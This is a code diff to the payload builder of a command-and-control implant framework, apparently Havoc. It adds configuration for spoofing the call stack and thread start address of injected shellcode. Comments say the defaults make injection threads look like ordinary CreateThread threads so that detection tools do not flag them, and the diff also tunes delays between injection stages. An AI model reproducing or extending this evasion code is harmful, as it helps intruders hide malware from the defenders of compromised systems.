@@ -144,16 +144,32 @@ type Builder struct {
 	preBytes   []byte
 
 	// demonProfile holds config read directly from the teamserver profile
-	// for fields that need profile-based defaults (SleepObfStartAddr, InjectSpoofAddr, ExecDelay).
+	// for fields that need profile-based defaults (SleepObfStartAddr, InjectSpoofAddr, ExecDelay, HVC-047 stack spoof blocks).
 	demonProfile struct {
-		SleepObfLib       string
-		SleepObfFunc      string
-		SleepObfOffset    int
-		InjectSpoofLib    string
-		InjectSpoofFunc   string
-		InjectSpoofOffset int
-		ExecDelay         int /* HVC-046: base delay seconds between injection stages */
-		ExecDelayJitter   int /* HVC-046: jitter % applied to ExecDelay */
+		SleepObfLib           string
+		SleepObfFunc          string
+		SleepObfOffset        int
+		InjectSpoofLib        string
+		InjectSpoofFunc       string
+		InjectSpoofOffset     int
+		ExecDelay             int    /* HVC-046: base delay seconds between injection stages */
+		ExecDelayJitter       int    /* HVC-046: jitter % applied to ExecDelay */
+		StackDuplication      bool   /* profile-sourced StackDuplication default */
+		StackSpoofStartLib    string /* HVC-047: TEB.Win32StartAddress spoof - library */
+		StackSpoofStartFunc   string /* HVC-047: TEB.Win32StartAddress spoof - function */
+		StackSpoofStartOffset int    /* HVC-047: TEB.Win32StartAddress spoof - offset */
+		StackSpoofFrame0Lib   string /* HVC-047: frame 0 library */
+		StackSpoofFrame0Func  string /* HVC-047: frame 0 function */
+		StackSpoofFrame0Offset int   /* HVC-047: frame 0 offset */
+		StackSpoofFrame1Lib   string /* HVC-047: frame 1 library */
+		StackSpoofFrame1Func  string /* HVC-047: frame 1 function */
+		StackSpoofFrame1Offset int   /* HVC-047: frame 1 offset */
+		StackSpoofFrame2Lib   string /* HVC-047: frame 2 library */
+		StackSpoofFrame2Func  string /* HVC-047: frame 2 function */
+		StackSpoofFrame2Offset int   /* HVC-047: frame 2 offset */
+		StackSpoofFrame3Lib   string /* HVC-047: frame 3 library */
+		StackSpoofFrame3Func  string /* HVC-047: frame 3 function */
+		StackSpoofFrame3Offset int   /* HVC-047: frame 3 offset */
 	}
 
 	// [HVC-005 2026-03-28] BCRYPT_RSAPUBLIC_BLOB embedded as SERVER_PUBKEY_BLOB.
@@ -630,7 +646,7 @@ func (b *Builder) Build() bool {
 			return false
 		}
 		if !b.silent {
-			b.SendConsoleMessage("Info", "DEBUG build complete — 'debug' trailer appended to binary")
+			b.SendConsoleMessage("Info", "DEBUG build complete - 'debug' trailer appended to binary")
 		}
 	}
 
@@ -730,7 +746,58 @@ func (b *Builder) SetDemonProfileDefaults(demon *profile.Demon) {
 	}
 	/* HVC-046: store profile ExecDelay defaults for use when the UI value is absent */
 	b.demonProfile.ExecDelay = demon.ExecDelay
-	b.demonProfile.ExecDelayJitter = demon.ExecDelayJitter
+	b.demonProfile.ExecDelayJitter  = demon.ExecDelayJitter
+	b.demonProfile.StackDuplication = demon.StackDuplication
+
+	/* HVC-047: stack spoof start address.
+	 * Default: kernel32!BaseThreadInitThunk — exported, not a syscall stub, not flagged SUS_START.
+	 * Makes the injection thread appear identical to a standard CreateThread-spawned thread. */
+	if demon.StackSpoofStartAddr != nil {
+		b.demonProfile.StackSpoofStartLib    = demon.StackSpoofStartAddr.Library
+		b.demonProfile.StackSpoofStartFunc   = demon.StackSpoofStartAddr.Function
+		b.demonProfile.StackSpoofStartOffset = demon.StackSpoofStartAddr.Offset
+	} else {
+		b.demonProfile.StackSpoofStartLib  = "kernel32.dll"
+		b.demonProfile.StackSpoofStartFunc = "BaseThreadInitThunk"
+	}
+
+	/* HVC-047: frame 0 — kernel32!BaseThreadInitThunk+0x14
+	 * The return address the shellcode "will return to" — matches what every CreateThread stack shows. */
+	if demon.StackSpoofFrame0 != nil {
+		b.demonProfile.StackSpoofFrame0Lib    = demon.StackSpoofFrame0.Library
+		b.demonProfile.StackSpoofFrame0Func   = demon.StackSpoofFrame0.Function
+		b.demonProfile.StackSpoofFrame0Offset = demon.StackSpoofFrame0.Offset
+	} else {
+		b.demonProfile.StackSpoofFrame0Lib    = "kernel32.dll"
+		b.demonProfile.StackSpoofFrame0Func   = "BaseThreadInitThunk"
+		b.demonProfile.StackSpoofFrame0Offset = 20 /* 0x14 */
+	}
+
+	/* HVC-047: frame 1 — ntdll!RtlUserThreadStart+0x21
+	 * Where BaseThreadInitThunk returns; stack walk terminates at frame 2 (NULL). */
+	if demon.StackSpoofFrame1 != nil {
+		b.demonProfile.StackSpoofFrame1Lib    = demon.StackSpoofFrame1.Library
+		b.demonProfile.StackSpoofFrame1Func   = demon.StackSpoofFrame1.Function
+		b.demonProfile.StackSpoofFrame1Offset = demon.StackSpoofFrame1.Offset
+	} else {
+		b.demonProfile.StackSpoofFrame1Lib    = "ntdll.dll"
+		b.demonProfile.StackSpoofFrame1Func   = "RtlUserThreadStart"
+		b.demonProfile.StackSpoofFrame1Offset = 33 /* 0x21 */
+	}
+
+	/* HVC-047: frames 2 and 3 — empty by default (NULL written to stack; walk stops at frame 2).
+	 * A real CreateThread stack has only two bottom frames; adding more here would be artificial. */
+	if demon.StackSpoofFrame2 != nil {
+		b.demonProfile.StackSpoofFrame2Lib    = demon.StackSpoofFrame2.Library
+		b.demonProfile.StackSpoofFrame2Func   = demon.StackSpoofFrame2.Function
+		b.demonProfile.StackSpoofFrame2Offset = demon.StackSpoofFrame2.Offset
+	}
+
+	if demon.StackSpoofFrame3 != nil {
+		b.demonProfile.StackSpoofFrame3Lib    = demon.StackSpoofFrame3.Library
+		b.demonProfile.StackSpoofFrame3Func   = demon.StackSpoofFrame3.Function
+		b.demonProfile.StackSpoofFrame3Offset = demon.StackSpoofFrame3.Offset
+	}
 }
 
 func (b *Builder) SetFormat(Format int) {
@@ -842,9 +909,24 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		ConfigVerbose           = win32.FALSE /* enable verbose debug output in demon */
 		ConfigCoffeeVeh         = win32.FALSE /* enable VEH for BOF object file loading */
 		ConfigCoffeeThreaded    = win32.FALSE /* enable threaded object file execution */
-		ConfigExecDelay         = 0           /* HVC-046: base delay seconds between injection stages; 0 = disabled */
-		ConfigExecDelayJitter   = 0           /* HVC-046: jitter % applied to ExecDelay; 0 = no jitter */
-		ConfigSleepObfLib       = ""          /* custom sleep-obf thread start address library (empty = default) */
+		ConfigExecDelay              = 0  /* HVC-046: base delay seconds between injection stages; 0 = disabled */
+		ConfigExecDelayJitter        = 0  /* HVC-046: jitter % applied to ExecDelay; 0 = no jitter */
+		ConfigStackSpoofStartLib     = "" /* HVC-047: stack spoof start addr library */
+		ConfigStackSpoofStartFunc    = "" /* HVC-047: stack spoof start addr function */
+		ConfigStackSpoofStartOffset  = 0  /* HVC-047: stack spoof start addr offset */
+		ConfigStackSpoofFrame0Lib    = "" /* HVC-047: frame 0 library */
+		ConfigStackSpoofFrame0Func   = "" /* HVC-047: frame 0 function */
+		ConfigStackSpoofFrame0Offset = 0  /* HVC-047: frame 0 offset */
+		ConfigStackSpoofFrame1Lib    = "" /* HVC-047: frame 1 library */
+		ConfigStackSpoofFrame1Func   = "" /* HVC-047: frame 1 function */
+		ConfigStackSpoofFrame1Offset = 0  /* HVC-047: frame 1 offset */
+		ConfigStackSpoofFrame2Lib    = "" /* HVC-047: frame 2 library */
+		ConfigStackSpoofFrame2Func   = "" /* HVC-047: frame 2 function */
+		ConfigStackSpoofFrame2Offset = 0  /* HVC-047: frame 2 offset */
+		ConfigStackSpoofFrame3Lib    = "" /* HVC-047: frame 3 library */
+		ConfigStackSpoofFrame3Func   = "" /* HVC-047: frame 3 function */
+		ConfigStackSpoofFrame3Offset = 0  /* HVC-047: frame 3 offset */
+		ConfigSleepObfLib            = "" /* custom sleep-obf thread start address library (empty = default) */
 		ConfigSleepObfFunc      = ""          /* function name */
 		ConfigSleepObfOffset    = 0           /* byte offset */
 		ConfigInjectSpoofLib    = ""          /* inject spoof addr library (empty = no spoof addr) */
@@ -1064,23 +1146,20 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 	}
 
 	if val, ok := b.config.Config["Stack Duplication"].(bool); ok {
-		if ConfigObfTechnique != SLEEPOBF_NO_OBF {
-			if val {
-				ConfigStackSpoof = win32.TRUE
-				if !b.silent {
-					b.SendConsoleMessage("Info", "Stack Duplication: Enabled")
-				}
-			}
-		} else {
-			// if no sleep obfuscation technique has been specified then
-			// stack spoofing is not possible during sleep lol.
+		if val && ConfigObfTechnique != SLEEPOBF_NO_OBF {
+			ConfigStackSpoof = win32.TRUE
 			if !b.silent {
-				b.SendConsoleMessage("Info", "Stack Duplication: Disabled")
+				b.SendConsoleMessage("Info", "Stack Duplication: Enabled")
 			}
 		}
-	} else {
-		return nil, errors.New("Stack Duplication is undefined")
+	} else if b.demonProfile.StackDuplication && ConfigObfTechnique != SLEEPOBF_NO_OBF {
+		/* profile fallback: StackDuplication = true in YAOTL, no UI override present */
+		ConfigStackSpoof = win32.TRUE
+		if !b.silent {
+			b.SendConsoleMessage("Info", "Stack Duplication: Enabled (from profile)")
+		}
 	}
+	/* if neither UI nor profile sets it, ConfigStackSpoof stays win32.FALSE */
 
 	if val, ok := b.config.Config["Proxy Loading"].(string); ok && len(val) > 0 {
 		switch val {
@@ -1230,28 +1309,130 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 		}
 	}
 
-	/* ExecDelay — base delay seconds between injection stages (HVC-046) */
+	/* ExecDelay — base delay seconds between injection stages (HVC-046).
+	 * UI sends "0" by default; only apply the UI value when it is explicitly non-zero.
+	 * When the UI value is zero (default), fall back to the profile value so that
+	 * havoc.yaotl ExecDelay is honoured even if the operator never touches the UI field. */
 	if val, ok := b.config.Config["Exec Delay"].(string); ok {
-		if n, err2 := strconv.Atoi(val); err2 == nil && n >= 0 {
+		if n, err2 := strconv.Atoi(val); err2 == nil && n > 0 {
 			ConfigExecDelay = n
 			if !b.silent {
 				b.SendConsoleMessage("Info", fmt.Sprintf("Exec Delay: %ds", n))
 			}
+		} else if b.demonProfile.ExecDelay > 0 {
+			ConfigExecDelay = b.demonProfile.ExecDelay
 		}
 	} else if b.demonProfile.ExecDelay > 0 {
 		ConfigExecDelay = b.demonProfile.ExecDelay
 	}
 
-	/* ExecDelayJitter — jitter % applied to ExecDelay (HVC-046) */
+	/* ExecDelayJitter — jitter % applied to ExecDelay (HVC-046). Same UI-zero fallback logic. */
 	if val, ok := b.config.Config["Exec Delay Jitter"].(string); ok {
-		if n, err2 := strconv.Atoi(val); err2 == nil && n >= 0 && n <= 100 {
+		if n, err2 := strconv.Atoi(val); err2 == nil && n > 0 && n <= 100 {
 			ConfigExecDelayJitter = n
 			if !b.silent {
 				b.SendConsoleMessage("Info", fmt.Sprintf("Exec Delay Jitter: %d%%", n))
 			}
+		} else if b.demonProfile.ExecDelayJitter > 0 {
+			ConfigExecDelayJitter = b.demonProfile.ExecDelayJitter
 		}
 	} else if b.demonProfile.ExecDelayJitter > 0 {
 		ConfigExecDelayJitter = b.demonProfile.ExecDelayJitter
+	}
+
+	/* HVC-047: stack spoof start address */
+	if val, ok := b.config.Config["Stack Spoof Start Library"].(string); ok && val != "" {
+		ConfigStackSpoofStartLib = val
+	} else {
+		ConfigStackSpoofStartLib = b.demonProfile.StackSpoofStartLib
+	}
+	if val, ok := b.config.Config["Stack Spoof Start Function"].(string); ok && val != "" {
+		ConfigStackSpoofStartFunc = val
+	} else {
+		ConfigStackSpoofStartFunc = b.demonProfile.StackSpoofStartFunc
+	}
+	if val, ok := b.config.Config["Stack Spoof Start Offset"].(string); ok && val != "" {
+		if n, err2 := strconv.Atoi(val); err2 == nil {
+			ConfigStackSpoofStartOffset = n
+		}
+	} else {
+		ConfigStackSpoofStartOffset = b.demonProfile.StackSpoofStartOffset
+	}
+
+	/* HVC-047: frame 0 */
+	if val, ok := b.config.Config["Stack Spoof Frame 0 Library"].(string); ok && val != "" {
+		ConfigStackSpoofFrame0Lib = val
+	} else {
+		ConfigStackSpoofFrame0Lib = b.demonProfile.StackSpoofFrame0Lib
+	}
+	if val, ok := b.config.Config["Stack Spoof Frame 0 Function"].(string); ok && val != "" {
+		ConfigStackSpoofFrame0Func = val
+	} else {
+		ConfigStackSpoofFrame0Func = b.demonProfile.StackSpoofFrame0Func
+	}
+	if val, ok := b.config.Config["Stack Spoof Frame 0 Offset"].(string); ok && val != "" {
+		if n, err2 := strconv.Atoi(val); err2 == nil {
+			ConfigStackSpoofFrame0Offset = n
+		}
+	} else {
+		ConfigStackSpoofFrame0Offset = b.demonProfile.StackSpoofFrame0Offset
+	}
+
+	/* HVC-047: frame 1 */
+	if val, ok := b.config.Config["Stack Spoof Frame 1 Library"].(string); ok && val != "" {
+		ConfigStackSpoofFrame1Lib = val
+	} else {
+		ConfigStackSpoofFrame1Lib = b.demonProfile.StackSpoofFrame1Lib
+	}
+	if val, ok := b.config.Config["Stack Spoof Frame 1 Function"].(string); ok && val != "" {
+		ConfigStackSpoofFrame1Func = val
+	} else {
+		ConfigStackSpoofFrame1Func = b.demonProfile.StackSpoofFrame1Func
+	}
+	if val, ok := b.config.Config["Stack Spoof Frame 1 Offset"].(string); ok && val != "" {
+		if n, err2 := strconv.Atoi(val); err2 == nil {
+			ConfigStackSpoofFrame1Offset = n
+		}
+	} else {
+		ConfigStackSpoofFrame1Offset = b.demonProfile.StackSpoofFrame1Offset
+	}
+
+	/* HVC-047: frame 2 */
+	if val, ok := b.config.Config["Stack Spoof Frame 2 Library"].(string); ok && val != "" {
+		ConfigStackSpoofFrame2Lib = val
+	} else {
+		ConfigStackSpoofFrame2Lib = b.demonProfile.StackSpoofFrame2Lib
+	}
+	if val, ok := b.config.Config["Stack Spoof Frame 2 Function"].(string); ok && val != "" {
+		ConfigStackSpoofFrame2Func = val
+	} else {
+		ConfigStackSpoofFrame2Func = b.demonProfile.StackSpoofFrame2Func
+	}
+	if val, ok := b.config.Config["Stack Spoof Frame 2 Offset"].(string); ok && val != "" {
+		if n, err2 := strconv.Atoi(val); err2 == nil {
+			ConfigStackSpoofFrame2Offset = n
+		}
+	} else {
+		ConfigStackSpoofFrame2Offset = b.demonProfile.StackSpoofFrame2Offset
+	}
+
+	/* HVC-047: frame 3 */
+	if val, ok := b.config.Config["Stack Spoof Frame 3 Library"].(string); ok && val != "" {
+		ConfigStackSpoofFrame3Lib = val
+	} else {
+		ConfigStackSpoofFrame3Lib = b.demonProfile.StackSpoofFrame3Lib
+	}
+	if val, ok := b.config.Config["Stack Spoof Frame 3 Function"].(string); ok && val != "" {
+		ConfigStackSpoofFrame3Func = val
+	} else {
+		ConfigStackSpoofFrame3Func = b.demonProfile.StackSpoofFrame3Func
+	}
+	if val, ok := b.config.Config["Stack Spoof Frame 3 Offset"].(string); ok && val != "" {
+		if n, err2 := strconv.Atoi(val); err2 == nil {
+			ConfigStackSpoofFrame3Offset = n
+		}
+	} else {
+		ConfigStackSpoofFrame3Offset = b.demonProfile.StackSpoofFrame3Offset
 	}
 
 	/* Apply profile-based address resolution fields */
@@ -1295,6 +1476,21 @@ func (b *Builder) PatchConfig() ([]byte, error) {
 	DemonConfig.AddInt(ConfigInjectSpoofOffset)  /* field 24 */
 	DemonConfig.AddInt(ConfigExecDelay)          /* field 25: HVC-046 base delay ms between injection stages */
 	DemonConfig.AddInt(ConfigExecDelayJitter)    /* field 26: HVC-046 jitter % applied to ExecDelay */
+	DemonConfig.AddString(ConfigStackSpoofStartLib)     /* field 28: HVC-047 */
+	DemonConfig.AddString(ConfigStackSpoofStartFunc)    /* field 29: HVC-047 */
+	DemonConfig.AddInt(ConfigStackSpoofStartOffset)     /* field 30: HVC-047 */
+	DemonConfig.AddString(ConfigStackSpoofFrame0Lib)    /* field 31: HVC-047 */
+	DemonConfig.AddString(ConfigStackSpoofFrame0Func)   /* field 32: HVC-047 */
+	DemonConfig.AddInt(ConfigStackSpoofFrame0Offset)    /* field 33: HVC-047 */
+	DemonConfig.AddString(ConfigStackSpoofFrame1Lib)    /* field 34: HVC-047 */
+	DemonConfig.AddString(ConfigStackSpoofFrame1Func)   /* field 35: HVC-047 */
+	DemonConfig.AddInt(ConfigStackSpoofFrame1Offset)    /* field 36: HVC-047 */
+	DemonConfig.AddString(ConfigStackSpoofFrame2Lib)    /* field 37: HVC-047 */
+	DemonConfig.AddString(ConfigStackSpoofFrame2Func)   /* field 38: HVC-047 */
+	DemonConfig.AddInt(ConfigStackSpoofFrame2Offset)    /* field 39: HVC-047 */
+	DemonConfig.AddString(ConfigStackSpoofFrame3Lib)    /* field 40: HVC-047 */
+	DemonConfig.AddString(ConfigStackSpoofFrame3Func)   /* field 41: HVC-047 */
+	DemonConfig.AddInt(ConfigStackSpoofFrame3Offset)    /* field 42: HVC-047 */
 
 	// Listener Config
 	switch b.config.ListenerType {
